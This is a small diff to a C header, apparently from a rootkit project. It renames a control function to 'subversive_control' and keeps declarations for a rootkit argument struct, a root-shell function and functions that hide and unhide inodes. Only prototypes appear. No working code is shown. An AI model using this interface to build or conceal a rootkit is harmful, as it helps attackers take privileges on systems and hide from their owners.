@@ -5,7 +5,7 @@
 #define warn(fmt, ...) fprintf(stderr, fmt"\n", ##__VA_ARGS__)
 
 struct rk_args;
-long anima_control(long mode, struct rk_args *args);
+long subversive_control(long mode, struct rk_args *args);
 void root_shell(void);
 void hide_inode(long);
 void unhide_inode(long);
